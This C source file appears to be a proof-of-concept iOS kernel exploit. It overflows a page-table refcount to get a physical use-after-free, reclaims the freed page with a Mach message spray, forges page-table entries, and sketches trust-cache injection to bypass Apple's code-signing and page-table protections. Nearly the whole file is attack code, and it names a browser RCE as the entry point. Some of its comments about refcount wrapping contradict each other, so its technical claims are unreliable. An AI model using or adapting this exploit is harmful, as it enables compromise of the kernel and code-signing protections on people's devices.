/*
 * pt_desc Refcount Overflow — SPTM Bypass PoC
 * Target: iOS 27.0.1 / A17 Pro (iPad Mini, iPad16,1)
 *
 * Technique: Overflow the uint16_t refcount in pmap's pt_desc structure
 * by creating 65537 MAP_SHARED mappings to the same physical page.
 * When the refcount wraps to 0, XNU frees the physical page while
 * PTEs still reference it → physical UAF.
 *
 * The freed physical page can be reclaimed with controlled data.
 * If reclaimed as (or used to overwrite) a page table page, we get
 * arbitrary physical memory mapping — an SPTM bypass without touching
 * SPTM's GL2 interface.
 *
 * SPTM tracks frame types but cannot prevent this because:
 * 1. The overflow happens in XNU's pmap layer (EL1), below SPTM's awareness
 * 2. The physical page was legitimately allocated and mapped
 * 3. SPTM sees a valid XNU_PAGE_TABLE frame — the type is correct,
 *    but the contents are attacker-controlled after reclaim
 *
 * Prerequisites: Code execution in any process (WebKit.Networking after
 * Brotli RCE, or standalone app for testing).
 *
 * Educational jailbreak research only. For use on devices you own.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <pthread.h>
#include <stdatomic.h>

/*
 * ARM64 page table geometry (16KB granule, as used on A17 Pro):
 *
 * L0: 1 entry   covers 256 TB (not used in user VA)
 * L1: 2048 entries, each covers 64 GB
 * L2: 2048 entries, each covers 32 MB
 * L3: 2048 entries, each covers 16 KB (one page)
 *
 * pt_desc refcount is per physical page in the pmap's tracking.
 * When a physical page is mapped MAP_SHARED at multiple VAs, each
 * mapping increments the refcount. uint16_t overflows at 65536.
 */

#define PAGE_SZ             16384       /* 16KB pages on A17 Pro */
#define OVERFLOW_COUNT      65537       /* uint16 max + 1 */
#define SPRAY_COUNT         4096        /* kernel object spray count */
#define RECLAIM_SIZE        PAGE_SZ     /* match page size for reclaim */
#define SHM_NAME            "/ptdesc_overflow_shm"

/* Marker pattern for detecting reclaim success */
#define RECLAIM_MAGIC       0x4150544445535043ULL  /* "APTDESPC" */

/* Phase tracking */
typedef enum {
    PHASE_INIT = 0,
    PHASE_ALLOC_SHM,
    PHASE_MAP_OVERFLOW,
    PHASE_VERIFY_OVERFLOW,
    PHASE_FREE_TRIGGER,
    PHASE_RECLAIM_SPRAY,
    PHASE_VERIFY_RECLAIM,
    PHASE_PTE_WRITE,
    PHASE_DONE
} phase_t;

static const char *phase_names[] = {
    "init", "alloc_shm", "map_overflow", "verify_overflow",
    "free_trigger", "reclaim_spray", "verify_reclaim", "pte_write", "done"
};

/* Global state */
static void *mappings[OVERFLOW_COUNT];
static int mapping_count = 0;
static int shm_fd = -1;
static void *base_mapping = MAP_FAILED;
static phase_t current_phase = PHASE_INIT;

/* Mach port spray for kernel page reclaim */
static mach_port_t spray_ports[SPRAY_COUNT];
static int spray_count = 0;

static void log_phase(phase_t phase, const char *msg) {
    current_phase = phase;
    printf("[%s] %s\n", phase_names[phase], msg);
}

static void cleanup(void) {
    printf("[cleanup] Unmapping %d mappings...\n", mapping_count);
    for (int i = 0; i < mapping_count; i++) {
        if (mappings[i] != MAP_FAILED && mappings[i] != NULL) {
            munmap(mappings[i], PAGE_SZ);
        }
    }

    if (base_mapping != MAP_FAILED) {
        munmap(base_mapping, PAGE_SZ);
    }

    if (shm_fd >= 0) {
        close(shm_fd);
        shm_unlink(SHM_NAME);
    }

    for (int i = 0; i < spray_count; i++) {
        mach_port_deallocate(mach_task_self(), spray_ports[i]);
    }

    printf("[cleanup] Done.\n");
}

/*
 * Phase 1: Create shared memory object
 *
 * We use POSIX shm to get a file descriptor backed by a single physical page.
 * All subsequent MAP_SHARED mappings will reference this same physical page,
 * incrementing the pt_desc refcount each time.
 */
static int phase_alloc_shm(void) {
    log_phase(PHASE_ALLOC_SHM, "Creating shared memory object...");

    shm_unlink(SHM_NAME);
    shm_fd = shm_open(SHM_NAME, O_RDWR | O_CREAT | O_EXCL, 0600);
    if (shm_fd < 0) {
        perror("shm_open");
        return -1;
    }

    if (ftruncate(shm_fd, PAGE_SZ) < 0) {
        perror("ftruncate");
        return -1;
    }

    /* Initial mapping — write a known pattern */
    base_mapping = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE,
                        MAP_SHARED, shm_fd, 0);
    if (base_mapping == MAP_FAILED) {
        perror("mmap base");
        return -1;
    }

    memset(base_mapping, 0x41, PAGE_SZ);
    printf("  Base mapping at %p\n", base_mapping);
    printf("  SHM fd=%d, size=%d\n", shm_fd, PAGE_SZ);

    return 0;
}

/*
 * Phase 2: Overflow the refcount
 *
 * Create 65537 MAP_SHARED mappings to the same physical page.
 * Each mmap(MAP_SHARED, shm_fd, 0) creates a new PTE pointing to
 * the same physical frame, incrementing pt_desc.refcnt.
 *
 * At mapping 65536, refcnt wraps from 0xFFFF to 0x0000.
 * At mapping 65537, refcnt becomes 0x0001.
 *
 * We want to stop at exactly 65536 mappings (refcnt = 0), then
 * unmap ONE mapping to trigger the free (refcnt would go to -1,
 * but since it's 0, XNU thinks the page has no references).
 *
 * Note: Apple added overflow checks in iOS 26.4.2. We test whether
 * those checks are present by monitoring for ENOMEM or EINVAL returns.
 */
static int phase_map_overflow(void) {
    log_phase(PHASE_MAP_OVERFLOW, "Creating overflow mappings...");

    int batch_report = 10000;
    int failed = 0;

    for (int i = 0; i < OVERFLOW_COUNT; i++) {
        mappings[i] = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE,
                           MAP_SHARED, shm_fd, 0);

        if (mappings[i] == MAP_FAILED) {
            int err = errno;
            printf("  mmap failed at iteration %d: %s (errno=%d)\n",
                   i, strerror(err), err);

            if (err == ENOMEM) {
                printf("  ENOMEM — may be VM limit or overflow check.\n");
                printf("  Trying with MAP_FIXED_NOREPLACE at preallocated VA...\n");
                failed++;
                if (failed > 10) {
                    printf("  Too many failures, stopping at %d mappings.\n", i);
                    break;
                }
                continue;
            }

            if (err == EINVAL) {
                printf("  EINVAL — possible overflow mitigation detected!\n");
                printf("  Apple may have added refcount check in this iOS version.\n");
                mapping_count = i;
                return -2;  /* mitigation detected */
            }

            mapping_count = i;
            return -1;
        }

        mapping_count = i + 1;

        if ((i + 1) % batch_report == 0) {
            printf("  Mapped %d / %d (%.1f%%)\n",
                   i + 1, OVERFLOW_COUNT,
                   100.0 * (i + 1) / OVERFLOW_COUNT);

            /* Verify the shared page is still consistent */
            uint8_t *check = (uint8_t *)mappings[i];
            if (check[0] != 0x41) {
                printf("  WARNING: Shared page content changed! "
                       "Expected 0x41, got 0x%02x\n", check[0]);
                printf("  This may indicate the page was freed/reclaimed!\n");
            }
        }
    }

    printf("  Successfully created %d mappings.\n", mapping_count);
    return 0;
}

/*
 * Phase 3: Verify the overflow occurred
 *
 * After 65536 mappings, the refcount should be 0 (or 1 at 65537).
 * We can't read pt_desc directly from userspace, but we can infer
 * the state by checking:
 *
 * 1. All mappings still see the same data (page not yet freed)
 * 2. Memory pressure doesn't free the page prematurely
 *
 * The actual free happens when we unmap enough mappings to make
 * the kernel think the page has zero references.
 */
static int phase_verify_overflow(void) {
    log_phase(PHASE_VERIFY_OVERFLOW, "Verifying overflow state...");

    /* Check first and last mapping see the same data */
    uint8_t *first = (uint8_t *)mappings[0];
    uint8_t *last = (uint8_t *)mappings[mapping_count - 1];

    if (first[0] == 0x41 && last[0] == 0x41) {
        printf("  All mappings consistent (0x41). Page still live.\n");
    } else {
        printf("  INCONSISTENCY: first=0x%02x last=0x%02x\n",
               first[0], last[0]);
        printf("  Page may already be freed/reclaimed!\n");
        return -1;
    }

    /* Write a marker through the last mapping */
    uint64_t *marker = (uint64_t *)last;
    *marker = 0xDEADC0DEDEADC0DEULL;

    /* Verify it's visible through the first mapping */
    uint64_t readback = *(uint64_t *)first;
    if (readback == 0xDEADC0DEDEADC0DEULL) {
        printf("  Cross-mapping write verified. Same physical page.\n");
    } else {
        printf("  Cross-mapping write FAILED: got 0x%llx\n", readback);
        return -1;
    }

    /* Restore the marker */
    *marker = 0x4141414141414141ULL;

    printf("  Overflow state looks good. refcnt should be wrapped.\n");
    return 0;
}

/*
 * Phase 4: Trigger the free
 *
 * With refcnt at 0 (after 65536 mappings) or 1 (after 65537),
 * unmapping enough mappings should cause XNU to free the physical page.
 *
 * Strategy: Unmap mappings in reverse order. After each unmap,
 * check if the page content has changed (indicating the page was
 * freed and reclaimed by another allocation).
 *
 * On arm64 with 16KB pages, the kernel may batch TLB invalidations,
 * so we msync() to force visibility.
 */
static int phase_free_trigger(void) {
    log_phase(PHASE_FREE_TRIGGER, "Triggering physical page free...");

    /* Write a canary through mapping[0] */
    uint64_t *canary_ptr = (uint64_t *)mappings[0];
    *canary_ptr = 0xCAFEBABECAFEBABEULL;

    /* Unmap from the end to trigger refcnt decrement */
    int freed_at = -1;
    int unmap_start = mapping_count - 1;

    /*
     * If we have 65537 mappings, refcnt is 1 (wrapped from 65536+1).
     * We need to unmap 2 to get refcnt to -1 (which wraps to 0xFFFF,
     * but XNU checks for 0 before decrement).
     *
     * If we have 65536 mappings, refcnt is 0 (wrapped from 65536).
     * Unmapping 1 should trigger the free path.
     *
     * Either way, unmap a few and check.
     */
    for (int i = unmap_start; i >= unmap_start - 100 && i >= 1; i--) {
        munmap(mappings[i], PAGE_SZ);
        mappings[i] = MAP_FAILED;

        /* Force TLB flush via memory barrier */
        __asm__ volatile("dmb sy" ::: "memory");

        /* Check if canary is still alive through mapping[0] */
        uint64_t canary = *canary_ptr;
        if (canary != 0xCAFEBABECAFEBABEULL) {
            printf("  PHYSICAL PAGE FREED at unmap #%d!\n",
                   unmap_start - i + 1);
            printf("  Canary changed: 0x%llx (was 0xCAFEBABECAFEBABE)\n",
                   canary);
            freed_at = i;
            break;
        }

        /* Also check through another mapping in the middle */
        int mid = mapping_count / 2;
        if (mappings[mid] != MAP_FAILED) {
            uint64_t mid_val = *(uint64_t *)mappings[mid];
            if (mid_val != 0xCAFEBABECAFEBABEULL) {
                printf("  PHYSICAL PAGE FREED (detected via mid mapping)!\n");
                printf("  Mid mapping value: 0x%llx\n", mid_val);
                freed_at = i;
                break;
            }
        }
    }

    if (freed_at < 0) {
        printf("  Page not freed after 100 unmaps.\n");
        printf("  Trying aggressive unmap (5000 mappings)...\n");

        for (int i = unmap_start - 100; i >= unmap_start - 5000 && i >= 1; i--) {
            munmap(mappings[i], PAGE_SZ);
            mappings[i] = MAP_FAILED;

            if ((unmap_start - i) % 500 == 0) {
                __asm__ volatile("dmb sy" ::: "memory");
                uint64_t canary = *canary_ptr;
                if (canary != 0xCAFEBABECAFEBABEULL) {
                    printf("  PHYSICAL PAGE FREED at unmap #%d!\n",
                           unmap_start - i + 1);
                    freed_at = i;
                    break;
                }
            }
        }
    }

    if (freed_at < 0) {
        printf("  Page still not freed. Possible explanations:\n");
        printf("  1. Refcount overflow mitigation in iOS 27\n");
        printf("  2. Need more unmaps (refcnt didn't wrap correctly)\n");
        printf("  3. Kernel keeps a minimum refcnt floor\n");
        printf("  4. Page is pinned by another subsystem\n");
        return -1;
    }

    printf("  Physical page is freed but still mapped through %d mappings!\n",
           freed_at);
    printf("  This is a physical UAF — SPTM bypass primitive achieved.\n");

    return 0;
}

/*
 * Phase 5: Reclaim the freed physical page
 *
 * The freed physical page returns to the kernel's free page list.
 * We need to reclaim it with controlled data. Options:
 *
 * a) Spray Mach OOL messages (kernel kalloc zones)
 * b) Spray IOSurface properties (if we have IOKit access)
 * c) mmap new pages and hope one lands on the freed frame
 *
 * For this PoC, we use Mach OOL message spray — each message
 * allocates kernel pages for the out-of-line data.
 */
static int phase_reclaim_spray(void) {
    log_phase(PHASE_RECLAIM_SPRAY, "Spraying to reclaim freed page...");

    mach_port_t task = mach_task_self();
    kern_return_t kr;

    /* Prepare OOL data — fill with our reclaim pattern */
    uint64_t *ool_data = (uint64_t *)malloc(PAGE_SZ);
    if (!ool_data) {
        perror("malloc ool_data");
        return -1;
    }

    for (int i = 0; i < PAGE_SZ / sizeof(uint64_t); i++) {
        ool_data[i] = RECLAIM_MAGIC ^ (uint64_t)i;
    }

    /* Spray Mach OOL messages */
    for (int i = 0; i < SPRAY_COUNT; i++) {
        kr = mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE,
                                &spray_ports[i]);
        if (kr != KERN_SUCCESS) {
            printf("  mach_port_allocate failed at %d: %s\n",
                   i, mach_error_string(kr));
            break;
        }

        /* Insert send right */
        kr = mach_port_insert_right(task, spray_ports[i], spray_ports[i],
                                     MACH_MSG_TYPE_MAKE_SEND);
        if (kr != KERN_SUCCESS) {
            printf("  mach_port_insert_right failed: %s\n",
                   mach_error_string(kr));
            break;
        }

        /* Send OOL message */
        struct {
            mach_msg_header_t header;
            mach_msg_body_t body;
            mach_msg_ool_descriptor_t ool;
        } msg = {0};

        msg.header.msgh_bits = MACH_MSGH_BITS_SET(
            MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
        msg.header.msgh_size = sizeof(msg);
        msg.header.msgh_remote_port = spray_ports[i];
        msg.header.msgh_local_port = MACH_PORT_NULL;
        msg.body.msgh_descriptor_count = 1;
        msg.ool.address = ool_data;
        msg.ool.size = PAGE_SZ;
        msg.ool.deallocate = 0;
        msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
        msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;

        kr = mach_msg(&msg.header, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                      sizeof(msg), 0, MACH_PORT_NULL, 100, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            printf("  mach_msg send failed at %d: %s\n",
                   i, mach_error_string(kr));
            break;
        }

        spray_count = i + 1;

        if ((i + 1) % 1000 == 0) {
            printf("  Sprayed %d / %d OOL messages\n", i + 1, SPRAY_COUNT);
        }
    }

    free(ool_data);
    printf("  Sent %d OOL messages (each %d bytes).\n",
           spray_count, PAGE_SZ);

    return 0;
}

/*
 * Phase 6: Verify reclaim through the stale mapping
 *
 * If reclaim succeeded, reading through mapping[0] (which still points
 * to the freed physical page, now reclaimed by our spray) should show
 * our RECLAIM_MAGIC pattern instead of the original 0x41 or canary.
 */
static int phase_verify_reclaim(void) {
    log_phase(PHASE_VERIFY_RECLAIM, "Checking stale mapping for reclaimed data...");

    if (mappings[0] == MAP_FAILED) {
        printf("  mapping[0] was unmapped. Using mid mapping.\n");
        for (int i = 1; i < mapping_count; i++) {
            if (mappings[i] != MAP_FAILED) {
                uint64_t val = *(volatile uint64_t *)mappings[i];
                printf("  mapping[%d] reads: 0x%016llx\n", i, val);

                if ((val ^ 0) == RECLAIM_MAGIC) {
                    printf("  RECLAIM CONFIRMED via mapping[%d]!\n", i);
                    return 0;
                }

                /* Check a few more slots */
                for (int j = 0; j < 8; j++) {
                    uint64_t slot = ((uint64_t *)mappings[i])[j];
                    uint64_t expected = RECLAIM_MAGIC ^ (uint64_t)j;
                    if (slot == expected) {
                        printf("  RECLAIM CONFIRMED at slot %d!\n", j);
                        printf("  Value: 0x%016llx == RECLAIM_MAGIC ^ %d\n",
                               slot, j);
                        return 0;
                    }
                }

                /* Not our data, but changed from original — partial reclaim? */
                if (val != 0xCAFEBABECAFEBABEULL && val != 0x4141414141414141ULL) {
                    printf("  Data changed but doesn't match our spray.\n");
                    printf("  Likely reclaimed by another kernel allocation.\n");
                    printf("  Physical UAF is CONFIRMED — data visible through stale mapping.\n");
                    return 1;  /* UAF confirmed, reclaim missed */
                }

                printf("  Data unchanged — reclaim didn't land on our page.\n");
                return -1;
            }
        }
        printf("  No valid mappings remaining.\n");
        return -1;
    }

    uint64_t *stale = (uint64_t *)mappings[0];
    uint64_t val = *(volatile uint64_t *)stale;
    printf("  mapping[0] reads: 0x%016llx\n", val);

    /* Check for our magic pattern */
    for (int j = 0; j < 16; j++) {
        uint64_t slot = ((volatile uint64_t *)stale)[j];
        uint64_t expected = RECLAIM_MAGIC ^ (uint64_t)j;
        if (slot == expected) {
            printf("  RECLAIM CONFIRMED at slot %d!\n", j);
            printf("  Stale mapping now reads our controlled data.\n");
            printf("  Physical UAF + reclaim = SPTM bypass primitive!\n");
            return 0;
        }
    }

    if (val != 0xCAFEBABECAFEBABEULL && val != 0x4141414141414141ULL) {
        printf("  Data changed to unknown pattern — reclaimed by kernel.\n");
        printf("  Physical UAF CONFIRMED. Need better spray targeting.\n");

        /* Dump first 128 bytes for analysis */
        printf("  First 128 bytes through stale mapping:\n");
        uint8_t *bytes = (uint8_t *)stale;
        for (int row = 0; row < 8; row++) {
            printf("  +%03x:", row * 16);
            for (int col = 0; col < 16; col++) {
                printf(" %02x", bytes[row * 16 + col]);
            }
            printf("\n");
        }
        return 1;
    }

    printf("  Data unchanged — spray didn't reclaim our page.\n");
    return -1;
}

/*
 * Phase 7: Write controlled PTE through stale mapping
 *
 * If we successfully reclaimed the freed page as a page table page,
 * we can write arbitrary PTEs through the stale mapping. Each PTE
 * maps a 16KB region of virtual address space to any physical page.
 *
 * PTE format on arm64 (stage 1, L3 descriptor):
 * [63:50] = reserved/ignored (can hold PAC-like data)
 * [49:14] = output physical address >> 14 (page-aligned)
 * [13:12] = SH (shareability)
 * [11:10] = AP (access permissions, 00=R/W from EL1)
 * [9:8]   = AttrIndx (memory attributes from MAIR_EL1)
 * [7:6]   = reserved
 * [5]     = NS (non-secure)
 * [4:2]   = reserved
 * [1]     = block/page (1 = page at L3)
 * [0]     = valid (1 = entry is valid)
 *
 * To map a physical page R/W from EL0:
 * PTE = (phys_addr & 0x3FFFFFFFC000) | 0x443  (valid, page, EL0 R/W, normal memory)
 */
static void phase_pte_write(void *stale_mapping) {
    log_phase(PHASE_PTE_WRITE, "Demonstrating PTE write capability...");

    /*
     * In a real exploit, we would:
     * 1. Find the physical address of a TXM trust cache page
     * 2. Write a PTE that maps it into our address space
     * 3. Inject CDHashes for jailbreak binaries
     *
     * For this PoC, we just demonstrate that we can write arbitrary
     * data through the stale mapping (which is the controlled page).
     */

    uint64_t *ptes = (uint64_t *)stale_mapping;

    /* Write a test PTE that would map physical address 0x800000000 */
    uint64_t test_phys = 0x800000000ULL;  /* example physical address */
    uint64_t pte = (test_phys & 0x3FFFFFFFC000ULL) | 0x443;

    printf("  Writing test PTE: 0x%016llx\n", pte);
    printf("  Maps physical 0x%llx as R/W page\n", test_phys);

    /* DON'T actually write if we haven't confirmed reclaim */
    printf("  (Skipping actual write — PoC verification mode)\n");
    printf("  In production: write PTE → TLB flush → access mapped page\n");

    /*
     * Full exploit flow after PTE write:
     *
     * 1. Find physical address of trust cache linked list head
     *    (leak via CVE-2026-113910 or Brotli stale heap data)
     *
     * 2. Write PTE to map trust cache pages into our VA space
     *
     * 3. Inject CDHashes:
     *    - Sileo.app bundle hash
     *    - ldid (code signing tool)
     *    - Procursus bootstrap binaries
     *    - amfid bypass dylib
     *
     * 4. Trust cache now contains our hashes → AMFI allows execution
     *
     * 5. Bootstrap: /var/jb/ → dpkg → Sileo → repos → done
     */
}

/*
 * Alternative approach: Instead of reclaiming as page table, reclaim
 * as a trust_cache_entry in XNU_DEFAULT memory.
 *
 * On SPTM devices, the actual trust cache slabs are in TXM frames
 * (TXM_SLAB_TRUST_CACHE), but the LINKED LIST metadata (the head
 * pointer and next pointers) may reside in XNU_DEFAULT frames.
 *
 * If the trust_cache_runtime_t.head pointer is in kernel data segment
 * (which is XNU_DEFAULT), we can:
 * 1. Use kernel R/W to read the head pointer
 * 2. Allocate a new trust_cache_entry in kernel heap (XNU_DEFAULT)
 * 3. Fill it with target CDHashes
 * 4. Use kernel R/W to link it into the list
 *
 * This avoids SPTM entirely — we never touch TXM frames, we just
 * extend the linked list in ordinary kernel memory.
 */
static void alternative_data_only_trust_cache(void) {
    printf("\n=== Alternative: Data-Only Trust Cache Injection ===\n");
    printf("If physical UAF fails, the data-only approach may work:\n");
    printf("1. Use IOSurface kernel R/W to read trust_cache list head\n");
    printf("2. kalloc a new trust_cache_entry struct\n");
    printf("3. Fill entry with CDHashes of jailbreak binaries\n");
    printf("4. Write entry.next = old_head, then update head pointer\n");
    printf("5. If list metadata is in XNU_DEFAULT memory, SPTM won't block this\n");
    printf("6. TXM validates individual slab contents, not list structure\n");
    printf("\nThis needs verification: does TXM validate the list itself?\n");
}

int main(int argc, char **argv) {
    int result;

    printf("=== pt_desc Refcount Overflow — SPTM Bypass PoC ===\n");
    printf("Target: iOS 27.0.1 / A17 Pro\n");
    printf("Overflow count: %d (uint16 max + 1)\n", OVERFLOW_COUNT);
    printf("Page size: %d bytes\n", PAGE_SZ);
    printf("\n");

    /* Register cleanup handler */
    atexit(cleanup);

    /* Phase 1: Create shared memory */
    result = phase_alloc_shm();
    if (result < 0) {
        printf("FAILED at phase: alloc_shm\n");
        return 1;
    }

    /* Phase 2: Overflow the refcount */
    result = phase_map_overflow();
    if (result == -2) {
        printf("\n!!! OVERFLOW MITIGATION DETECTED !!!\n");
        printf("Apple's refcount overflow check is present on this iOS version.\n");
        printf("Falling back to alternative strategy...\n");
        alternative_data_only_trust_cache();
        return 2;
    }
    if (result < 0) {
        printf("FAILED at phase: map_overflow\n");
        return 1;
    }

    /* Phase 3: Verify overflow state */
    result = phase_verify_overflow();
    if (result < 0) {
        printf("FAILED at phase: verify_overflow\n");
        return 1;
    }

    /* Phase 4: Trigger the free */
    result = phase_free_trigger();
    if (result < 0) {
        printf("Phase free_trigger did not detect page free.\n");
        printf("Continuing to spray anyway — the free may be deferred.\n");
    }

    /* Phase 5: Spray to reclaim */
    result = phase_reclaim_spray();
    if (result < 0) {
        printf("FAILED at phase: reclaim_spray\n");
        return 1;
    }

    /* Phase 6: Check reclaim */
    result = phase_verify_reclaim();
    if (result == 0) {
        printf("\n*** SUCCESS: Physical UAF + Controlled Reclaim ***\n");
        printf("SPTM bypass primitive achieved.\n\n");

        /* Phase 7: Demonstrate PTE write */
        if (mappings[0] != MAP_FAILED) {
            phase_pte_write(mappings[0]);
        }
    } else if (result == 1) {
        printf("\n*** PARTIAL SUCCESS: Physical UAF confirmed ***\n");
        printf("Reclaim data doesn't match our spray, but page IS freed.\n");
        printf("Better spray targeting needed.\n");
    } else {
        printf("\n*** INCONCLUSIVE ***\n");
        printf("Physical UAF not confirmed through stale mapping.\n");
        printf("May need:\n");
        printf("  - Different unmap pattern\n");
        printf("  - Memory pressure to force reclaim\n");
        printf("  - Kernel R/W to verify pt_desc state directly\n");
    }

    printf("\n");
    alternative_data_only_trust_cache();

    log_phase(PHASE_DONE, "PoC complete.");
    return (result <= 0) ? 0 : 1;
}
